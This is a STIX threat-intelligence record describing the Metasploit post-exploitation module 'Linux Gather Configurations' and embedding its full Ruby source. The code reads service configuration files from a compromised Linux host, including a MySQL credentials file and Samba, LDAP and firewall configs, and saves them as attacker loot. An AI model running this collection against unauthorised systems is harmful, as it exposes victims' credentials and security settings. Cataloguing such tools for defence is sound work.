{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e4d52056-ad8e-44cb-a1a0-29568dd05875",
    "created": "2024-08-14T16:33:17.985628Z",
    "modified": "2024-08-14T16:33:17.985632Z",
    "name": "Linux Gather Configurations",
    "description": " This module collects configuration files found on commonly installed applications and services, such as Apache, MySQL, Samba, Sendmail, etc. If a config file is found in its default path, the module will assume that is the file we want.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/enum_configs.rb",
            "external_id": "enum_configs.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Linux::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux Gather Configurations',\n        'Description' => %q{\n          This module collects configuration files found on commonly installed\n          applications and services, such as Apache, MySQL, Samba, Sendmail, etc.\n          If a config file is found in its default path, the module will assume\n          that is the file we want.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'ohdae <bindshell[at]live.com>',\n        ],\n        'Platform' => ['linux'],\n        'SessionTypes' => ['shell', 'meterpreter']\n      )\n    )\n  end\n\n  def run\n    distro = get_sysinfo\n\n    print_status \"Running module against #{session.session_host} [#{get_hostname}]\"\n    print_status 'Info:'\n    print_status \"\\t#{distro[:version]}\"\n    print_status \"\\t#{distro[:kernel]}\"\n\n    vprint_status 'Finding configuration files...'\n    find_configs\n  end\n\n  def save(file, data, ctype = 'text/plain')\n    ltype = 'linux.enum.conf'\n    fname = ::File.basename(file)\n    loot = store_loot(ltype, ctype, session, data, fname)\n    print_good(\"#{fname} stored in #{loot}\")\n  end\n\n  def find_configs\n    configs = [\n      '/etc/apache2/apache2.conf', '/etc/apache2/ports.conf', '/etc/nginx/nginx.conf',\n      '/etc/snort/snort.conf', '/etc/mysql/my.cnf', '/etc/ufw/ufw.conf',\n      '/etc/ufw/sysctl.conf', '/etc/security.access.conf', '/etc/shells',\n      '/etc/security/sepermit.conf', '/etc/ca-certificates.conf', '/etc/security/access.conf',\n      '/etc/gated.conf', '/etc/rpc', '/etc/psad/psad.conf', '/etc/mysql/debian.cnf',\n      '/etc/chkrootkit.conf', '/etc/logrotate.conf', '/etc/rkhunter.conf',\n      '/etc/samba/smb.conf', '/etc/ldap/ldap.conf', '/etc/openldap/openldap.conf',\n      '/etc/cups/cups.conf', '/etc/opt/lampp/etc/httpd.conf', '/etc/sysctl.conf',\n      '/etc/proxychains.conf', '/etc/cups/snmp.conf', '/etc/mail/sendmail.conf',\n      '/etc/snmp/snmp.conf'\n    ]\n\n    configs.each do |f|\n      output = read_file(f).to_s\n      next if output.strip.empty?\n      next if output =~ /No such file or directory/\n\n      save(f, output)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}